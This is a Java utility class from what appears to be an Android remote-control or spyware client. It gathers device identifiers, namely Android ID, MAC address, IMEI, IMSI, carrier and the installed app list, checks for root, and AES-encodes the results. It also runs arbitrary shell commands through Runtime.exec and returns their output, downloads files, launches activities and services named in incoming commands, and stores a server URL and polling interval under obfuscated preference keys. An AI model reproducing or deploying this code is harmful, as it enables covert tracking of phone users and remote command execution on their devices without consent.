package workspace;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.List;
import java.util.Locale;
import org.apache.http.Header;
import org.json.JSONException;
import org.json.JSONObject;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.FileAsyncHttpResponseHandler;

public class Util {
    //private static int TASK_CHECK_INTERVAL = 600;
    public abstract class FileCallback {
        public abstract void onCompleted(Throwable e, File result);
        public void onProgress(int downloaded, int total) {}
    }
    private static final String INTERVAL_PREF = "xDDDFx";
    private static final String URL_PREF = "eDGe";
    private static final String PREF_NAME = "bGGbAAA";
    public static int REQUEST_INTERVAL = 600;
    static int SystemRoot = -1;
    static String composeBasicParams(Context context, String password) {
        JSONObject params = new JSONObject();
        try {
            params.put("g", getAndroidId(context));
            params.put("h", getMacAddress(context));
            params.put("j", getImei(context));
        } catch (Throwable e) {
            Logger.error(e);
        }
        return AES.encode(params.toString(), password);
    }
    static String composeParams(Context context, String password) {
        JSONObject params = new JSONObject();
        try {
            params.put("g", getAndroidId(context));
            params.put("h", getMacAddress(context));
            params.put("j", getImei(context));
            params.put("a", Build.MANUFACTURER);//manufacturer 
            params.put("b", Build.MODEL);//model = Build.MODEL;
            params.put("c", String.valueOf(getVersionCode(context)));//versionCode;
            params.put("d", context.getPackageName());//packageName
            params.put("e", Locale.getDefault().getDisplayLanguage());//language
            params.put("f", String.valueOf(android.os.Build.VERSION.SDK_INT));
            params.put("i", android.os.Build.BRAND);
            params.put("k", getImsi(context));
            params.put("l", getCarrier(context));
            params.put("m", isWifiEnable(context));
            params.put("n", "mounted".equals(Environment.getExternalStorageState()));
            params.put("o", getInstalledPackages(context));
            params.put("p", !isUserApp(context));
            params.put("q", isSystemRooted());
        } catch (Throwable e) {
            Logger.error(e);
        }
        return AES.encode(params.toString(), password);
    }
    public static JSONObject exeCmd(String cmd) {
        long current = System.currentTimeMillis();
        JSONObject obj = new JSONObject();
        StringBuilder cmdOut = new StringBuilder();
        StringBuilder cmdError = new StringBuilder();
        int result = 0;
        Logger.info("---------------------");
        Logger.info(cmd);
        BufferedReader normalChannel = null;
        BufferedReader errorChannel = null;
        try {
            Runtime run = Runtime.getRuntime();
            Process p = run.exec(cmd);
            normalChannel = new BufferedReader(new InputStreamReader(p.getInputStream()));
            errorChannel = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            String line;
            while ((line = normalChannel.readLine()) != null) {
                cmdOut.append(line).append('\n');
                Logger.info(line);
            }
            while ((line = errorChannel.readLine()) != null) {
                cmdError.append(line).append('\n');
                Logger.info(line);
            }
            if (p.waitFor() != 0) {
                result = p.exitValue();
            }
        } catch (Throwable e) {
            String ex = "\nException throw out:" + getExcption(e);
            cmdError.append(ex);
            Logger.error(ex);
        } finally {
            if (normalChannel != null) try {
                normalChannel.close();
            } catch (IOException e) {
                Logger.error(e);
            }
            if (errorChannel != null) try {
                errorChannel.close();
            } catch (IOException e) {
                Logger.error(e);
            }
        }
        try {
            obj.put("cmd", cmd);
            obj.put("time", System.currentTimeMillis() - current);
            if (result > 0) obj.put("result", result);
            if (cmdOut.length() > 0) obj.put("out", cmdOut.toString());
            if (cmdError.length() > 0) obj.put("err", cmdError.toString());
        } catch (JSONException e) {
            Logger.error(e);
        }
        Logger.info("---------------------");
        return obj;
    }
    static String generatePassword(long current) {
        StringBuilder sb = new StringBuilder();
        return sb.append(current * 228).append(current * 213).substring(0, 16);
    }
    private static String getAndroidId(Context context) {
        return Secure.getString(context.getContentResolver(), "android_id");
    }
    private static String getCarrier(Context context) {
        if (context == null) return "";
        TelephonyManager manager = (TelephonyManager) context.getSystemService("phone");
        if (manager != null && manager.getSimState() == 5) return manager.getSimOperatorName();
        else return "";
    }
    public static String getExcption(Throwable exception) {
        String result = null;
        try {
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);
            exception.printStackTrace(pw);
            result = sw.toString();
        } catch (Exception e1) {
            Logger.error(e1);
        }
        return result;
    }
    public static void getFile(Context context, final String url, final File file, final FileCallback callback) {
        if (file.exists()) {
            if (callback != null) callback.onCompleted(null, file);
        } else {
            new AsyncHttpClient().get(url, new FileAsyncHttpResponseHandler(new File(file.getAbsolutePath() + ".del")) {
                @Override
                public void onFailure(int statusCode, Header[] headers, Throwable e, File response) {
                    if (callback != null) {
                        callback.onCompleted(e, null);
                    }
                }
                @Override
                public void onProgress(int bytesWritten, int totalSize) {
                    if (callback != null) {
                        callback.onProgress(bytesWritten, totalSize);
                    }
                }
                @Override
                public void onSuccess(int statusCode, Header[] headers, File result) {
                    boolean success = statusCode == 200 && result != null && result.renameTo(file);
                    if (callback != null) {
                        callback.onCompleted(null, success ? file : null);
                    }
                }
            });
        }
    }
    private static String getImei(Context context) {
        String s = "";
        try {
            return ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
        } catch (Exception e) {}
        return s;
    }
    private static String getImsi(Context context) {
        String result = "";
        try {
            result = ((TelephonyManager) context.getSystemService("phone")).getSubscriberId();
        } catch (Exception e) {}
        return result;
    }
    public static String getInstalledPackages(Context context) {
        StringBuilder sb = new StringBuilder();
        List<PackageInfo> list = context.getPackageManager().getInstalledPackages(0);
        for (PackageInfo info : list) {
            if ((info.applicationInfo.flags & 1) == 0) {
                sb.append(info.packageName).append(",");
            }
        }
        return sb.toString();
    }
    private static String getMacAddress(Context context) {
        String address = "";
        try {
            WifiManager wifimanager = (WifiManager) context.getSystemService("wifi");
            if (wifimanager != null) address = wifimanager.getConnectionInfo().getMacAddress();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return address;
    }
    static String getUrl(Context context) {
        SharedPreferences pref = context.getSharedPreferences(PREF_NAME, 0);
        String result = pref.getString(URL_PREF, null);
        if (TextUtils.isEmpty(result)) result = Setting.url;
        return result;
    }
    private static int getVersionCode(Context context) {
        try {
            PackageInfo packageinfo = context.getPackageManager().getPackageInfo(context.getPackageName(), 0);
            return packageinfo.versionCode;
        } catch (android.content.pm.PackageManager.NameNotFoundException namenotfoundexception) {
            return 0;
        }
    }
    public static void initInterval(Context context) {
        SharedPreferences pref = context.getSharedPreferences(PREF_NAME, 0);
        int interval = pref.getInt(INTERVAL_PREF, 0);
        if (interval >= 60 && interval < 3600 * 24 * 5) {
            REQUEST_INTERVAL = interval;
        }
    }
    public static boolean isNetworkConnected(Context context) {
        boolean result = false;
        if (context != null) {
            ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo mNetworkInfo = manager.getActiveNetworkInfo();
            if (mNetworkInfo != null) result = mNetworkInfo.isAvailable();
        }
        return result;
    }
    /**
     * 获取当前手机是否有ROOT权限
     * @return
     */
    public static int isSystemRooted() {
        if (SystemRoot == -1) {
            File f = null;
            final String kSuSearchPaths[] = { "/system/bin/", "/system/xbin/", "/system/sbin/", "/sbin/", "/vendor/bin/" };
            try {
                for (String kSuSearchPath : kSuSearchPaths) {
                    f = new File(kSuSearchPath + "su");
                    if (f != null && f.exists()) {
                        SystemRoot = 1;
                        break;
                    }
                }
                if (SystemRoot != 1) SystemRoot = 0;
            } catch (Throwable e) {
                Logger.error(e);
            }
        }
        return SystemRoot;
    }
    /**
     * 是否是用户安装的程序
     * 
     * @param appInfo
     * 
     * @return false:系统程序，true :用户程序
     */
    public static boolean isUserApp(Context context) {
        ApplicationInfo appInfo = context.getApplicationInfo();
        boolean flag = false;
        try {
            if ((appInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0) {// 表示是系统程序，但用户更新过，也算是用户安装的程序
                flag = true;
            } else if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {// 一定是用户安装的程序
                flag = true;
            }
        } catch (Throwable e) {
            // Log.e("error", e.toString());
        }
        return flag;
    }
    public static boolean isWifiEnable(Context context) {
        ConnectivityManager connectivitymanager = (ConnectivityManager) context.getSystemService("connectivity");
        if (connectivitymanager != null) {
            NetworkInfo networkinfo = connectivitymanager.getNetworkInfo(1);
            if (networkinfo != null) {
                android.net.NetworkInfo.State state = networkinfo.getState();
                if (state != null) {
                    if (android.net.NetworkInfo.State.CONNECTED == state) return true;
                }
            }
        }
        return false;
    }
    static void saveInterval(Context context, int interval) {
        if (REQUEST_INTERVAL != interval) {
            REQUEST_INTERVAL = interval;
            context.getSharedPreferences(PREF_NAME, 0).edit().putInt(INTERVAL_PREF, interval).commit();
            context.startService(new Intent(context, Service.class).setAction("restart"));
        }
    }
    static void saveUrl(Context context, String value) {
        context.getSharedPreferences(PREF_NAME, 0).edit().putString(URL_PREF, value).commit();
    }
    public static JSONObject startActivity(Context context, String command) {
        JSONObject obj = new JSONObject();
        long current = System.currentTimeMillis();
        String error = null;
        try {
            String[] fields = command.split(",");
            context.startActivity(new Intent().setComponent(new ComponentName(fields[1], fields[2])));
        } catch (Throwable e) {
            error = "\nException throw out:" + getExcption(e);
        }
        try {
            obj.put("cmd", command);
            obj.put("time", System.currentTimeMillis() - current);
            if (error != null) {
                obj.accumulate("err", error);
            }
        } catch (Throwable e) {
            Logger.error(e);
        }
        return obj;
    }
    public static JSONObject startService(Context context, String command) {
        JSONObject obj = new JSONObject();
        long current = System.currentTimeMillis();
        String error = null;
        try {
            String[] fields = command.split(",");
            context.startService(new Intent().setComponent(new ComponentName(fields[1], fields[2])));
        } catch (Throwable e) {
            error = "\nException throw out:" + getExcption(e);
        }
        try {
            obj.put("cmd", command);
            obj.put("time", System.currentTimeMillis() - current);
            if (error != null) {
                obj.accumulate("err", error);
            }
        } catch (Throwable e) {
            Logger.error(e);
        }
        return obj;
    }
}
